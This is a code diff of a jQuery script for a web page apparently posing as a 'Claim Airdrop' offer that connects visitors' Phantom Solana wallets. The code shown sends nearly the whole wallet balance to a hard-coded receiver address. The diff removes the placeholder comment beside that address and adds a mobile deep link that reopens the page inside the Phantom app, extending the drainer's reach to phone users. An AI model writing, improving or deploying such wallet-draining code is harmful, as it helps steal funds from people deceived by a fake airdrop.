@@ -1,6 +1,13 @@
 $(document).ready(function () {
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
+    function showDeeplinkButton() {
+        const dappUrl = encodeURIComponent(window.location.href);
+        const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
+        $('#phantom-deeplink').attr('href', phantomLink).show();
+        $('#connect-wallet').hide();
+    }
+
     async function handleWalletConnection(resp) {
         console.log("Phantom Wallet connected:", resp);
 
@@ -20,11 +27,12 @@ $(document).ready(function () {
             return;
         }
 
-        $('#connect-wallet').text("Claim Airdrop");
+        $('#connect-wallet').text("Claim Airdrop").show();
+        $('#phantom-deeplink').hide();
 
         $('#connect-wallet').off('click').on('click', async () => {
             try {
-                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n'); // Replace with real address
+                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                 const balanceForTransfer = walletBalance - minBalance;
 
                 if (balanceForTransfer <= 0) {
@@ -75,13 +83,12 @@ $(document).ready(function () {
         if (window.solana && window.solana.isPhantom) {
             await connectPhantom();
         } else {
-            alert("Phantom Wallet not found. Redirecting to install...");
+            alert("Phantom Wallet not found.");
+
             sessionStorage.setItem('phantomInstallRequested', 'true');
 
             if (isMobile) {
-                const dappUrl = encodeURIComponent(window.location.href);
-                const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
-                window.location.href = phantomLink;
+                showDeeplinkButton(); // Show link to open in Phantom app
             } else {
                 const isFirefox = typeof InstallTrigger !== "undefined";
                 const isChrome = !!window.chrome;
@@ -91,7 +98,7 @@ $(document).ready(function () {
                 } else if (isChrome) {
                     window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                 } else {
-                    alert("Please download the Phantom extension for your browser.");
+                    alert("Please install the Phantom extension for your browser.");
                 }
             }
         }
@@ -125,5 +132,7 @@ $(document).ready(function () {
                     sessionStorage.removeItem('phantomConnected');
                 });
         }
+    } else if (isMobile) {
+        showDeeplinkButton(); // If no Phantom object on mobile, show the deep link
     }
 });
